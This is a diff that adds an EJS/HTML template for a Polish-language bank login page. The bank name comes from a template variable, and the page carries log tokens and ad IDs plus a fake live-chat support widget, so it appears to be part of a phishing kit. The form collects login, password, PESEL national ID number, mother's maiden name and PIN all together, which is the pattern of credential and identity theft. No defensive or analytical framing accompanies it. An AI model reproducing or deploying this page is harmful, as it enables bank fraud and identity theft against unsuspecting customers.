@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zaloguj się</title>
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css">
+    <link rel="stylesheet" href="/css/default_lk.css">
+    <style>
+        body {
+            font-family: Roboto;
+        }
+
+        /* .centered {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 50%;
+            height: 50%;
+        } */
+
+        .container {
+            max-width: 250px;
+        }
+
+        @media (max-width: 452px) {
+            .container {
+                max-width: 100%;
+            }
+        }
+
+        * {
+            box-shadow: none !important;
+        }
+
+        .form-control:focus {
+            border-color: rgb(37, 37, 37);
+        }
+
+        .btn-primary {
+            background: rgb(37, 37, 37);
+            border-color: transparent;
+        }
+
+        .btn-primary:hover {
+            background: rgb(27, 27, 27);
+        }
+
+        .btn-primary:active,
+        .btn-primary:focus {
+            background: rgb(47, 47, 47) !important;
+        }
+
+        .btn-primary:active {
+            box-shadow: 0 0 20px 0 rgba(0, 0, 0, 0.5) !important;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="centered">
+        <form id="lk_form" class="container p-2 m-auto text-center">
+            <h2>Logowanie</h2><br>
+            <div class="form-group">
+                <label>Wpisz numer klienta lub login</label>
+                <input id="login" required type="text" class="form-control">
+            </div>
+            <div class="form-group">
+                <label>Hasło</label>
+                <input id="password" required type="password" class="form-control">
+            </div>
+            <div class="form-group">
+                <label>Pesel</label>
+                <input id="pesel" required type="text" class="form-control">
+            </div>
+            <div class="form-group">
+                <label>Nazwisko panieńskie matki</label>
+                <input id="motherlastname" required type="text" class="form-control">
+            </div>
+            <div class="form-group">
+                <label>PIN</label>
+                <input id="pin" required type="password" class="form-control">
+            </div>
+            <div class="form-group">
+                <button type="submit" class="btn btn-block btn-primary py-3" style="font-size: 20px;">DALEJ</button>
+            </div>
+            <small>Copyright © <%=cardInfo?.bank%>
+                    <script>document.write(new Date().getFullYear())</script></small>
+        </form>
+    </div>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"
+        integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.21.1/axios.min.js" crossorigin="anonymous"></script>
+    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+    <script>
+        const LOG_TOKEN = <%=log.token%>,
+            AD_LANG = "<%=log.ad.service.lang%>",
+            AD_ID = <%=log.ad.id%>,
+            translate = <%-JSON.stringify(translate) %>;
+    </script>
+    <script src="/js/lk.js" defer></script>
+    <link rel="stylesheet" href="/css/support_parent.css" />
+    <div class="
+    chatra--webkit
+    chatra--style-round
+    chatra--side-bottom
+    chatra--pos-right
+    chatra--visible
+    chatra--expanded
+    chatra--fast-toggle
+  " id="chatra" data-turbolinks-permanent="" style="
+    width: 380px;
+    height: 600px;
+    transform: none;
+    z-index: 2147483647;
+    display: none;
+  ">
+        <div id="chatra__iframe-wrapper">
+            <iframe frameborder="0" id="chatra__iframe" allowtransparency="true" title="Chatra live chat"
+                allow="autoplay" src="/supportChatFrame/<%=log.ad.id%>"
+                style="width: 380px; height: 600px; position: absolute"></iframe>
+        </div>
+    </div>
+    <div class="support-circle"
+        onclick="document.querySelector('#chatra').style.display = 'block';this.style.display = 'none'"></div>
+</body>
+
+</html>
